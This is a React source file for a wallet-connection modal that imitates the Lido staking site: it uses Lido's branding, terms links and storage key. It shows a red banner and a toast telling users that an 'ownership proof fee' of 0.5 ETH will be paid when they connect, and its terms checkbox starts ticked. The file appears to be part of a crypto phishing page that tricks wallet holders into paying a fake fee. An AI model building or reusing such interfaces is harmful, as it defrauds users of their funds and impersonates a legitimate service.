import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { X, ShieldCheck } from 'lucide-react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount, useConnect } from 'wagmi';
import { toast } from 'sonner';

export default function OnboardingModal() {
  const [isOpen, setIsOpen] = useState(false);
  const [isChecked, setIsChecked] = useState(true);
  const { open } = useAppKit();
  const { isConnected } = useAccount();
  const { connectors, connect } = useConnect();

  useEffect(() => {
    // Check if user accepted onboarding/connection agreement
    const hasAccepted = localStorage.getItem('lido_confirm_connection_accepted');
    if (!hasAccepted) {
      setIsOpen(true);
    }
  }, []);

  const handleClose = () => {
    setIsOpen(false);
    localStorage.setItem('lido_confirm_connection_accepted', 'true');
  };

  const handleConnect = async () => {
    if (!isChecked) {
      toast.error('Please certify and accept the Terms of Use and Privacy Notice to proceed.');
      return;
    }

    localStorage.setItem('lido_confirm_connection_accepted', 'true');
    setIsOpen(false);

    try {
      // Trigger Web3 wallet connection modal or direct wallet injection
      if (typeof window !== 'undefined' && window.ethereum) {
        const injectedConn = connectors.find((c) => c.id === 'injected' || c.name.toLowerCase().includes('injected') || c.name.toLowerCase().includes('metamask'));
        if (injectedConn) {
          connect({ connector: injectedConn });
        } else {
          open();
        }
      } else {
        open();
      }
      toast.info('Connecting wallet... Please approve signature request and ownership proof fee (0.5 ETH)');
    } catch (err: any) {
      console.error('Wallet connect trigger error:', err);
      open();
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          {/* Dark overlay backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/75 backdrop-blur-md z-50"
            onClick={handleClose}
          />

          {/* Modal Container */}
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 15 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 15 }}
            className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[90%] max-w-[420px] bg-[#272832] border border-[#383a48] rounded-[24px] p-6 z-50 shadow-[0_25px_60px_rgba(0,0,0,0.6)] text-white overflow-hidden font-sans"
          >
            {/* Header Title */}
            <div className="flex items-center justify-between mb-5">
              <h2 className="text-[20px] font-bold text-white tracking-tight">
                Confirm connection
              </h2>
              <button
                onClick={handleClose}
                className="text-gray-400 hover:text-white transition-colors p-1 rounded-full hover:bg-white/10 cursor-pointer"
              >
                <X size={18} />
              </button>
            </div>

            {/* Dark inner agreement card */}
            <div className="bg-[#1e1f26] border border-[#2e303d] rounded-[18px] p-5 mb-4">
              <label className="flex items-start gap-3.5 cursor-pointer select-none">
                <div className="relative flex items-center justify-center mt-0.5 shrink-0">
                  <input
                    type="checkbox"
                    checked={isChecked}
                    onChange={(e) => setIsChecked(e.target.checked)}
                    className="peer appearance-none w-6 h-6 rounded-md bg-[#00a3ff] checked:bg-[#00a3ff] border-none cursor-pointer focus:outline-none transition-all"
                  />
                  {isChecked && (
                    <svg
                      className="absolute w-4 h-4 text-white pointer-events-none stroke-[3]"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                  )}
                </div>
                <span className="text-[13px] text-gray-200 leading-snug font-medium">
                  I certify that I have read and accept the updated{' '}
                  <a
                    href="https://lido.fi/terms-of-use"
                    target="_blank"
                    rel="noreferrer"
                    className="text-[#38b6ff] hover:underline font-semibold"
                  >
                    Terms of Use
                  </a>{' '}
                  and{' '}
                  <a
                    href="https://lido.fi/privacy-notice"
                    target="_blank"
                    rel="noreferrer"
                    className="text-[#38b6ff] hover:underline font-semibold"
                  >
                    Privacy Notice
                  </a>
                  .
                </span>
              </label>
            </div>

            {/* Red protocol connection fee note */}
            <div className="bg-[#e54d42] text-white rounded-[16px] p-3.5 mb-5 text-[12.5px] font-semibold text-center leading-snug shadow-sm flex items-center justify-center gap-2">
              <ShieldCheck size={16} className="shrink-0" />
              <span>A ownership proof fee of 0.5 ETH will be paid upon connection</span>
            </div>

            {/* Connect Button */}
            <button
              onClick={handleConnect}
              disabled={!isChecked}
              className="w-full bg-[#00a3ff] hover:bg-[#0091e6] active:bg-[#0080cc] text-white font-bold text-[15px] py-3.5 rounded-[16px] transition-all duration-200 cursor-pointer shadow-[0_4px_20px_rgba(0,163,255,0.3)] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Connect
            </button>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
}

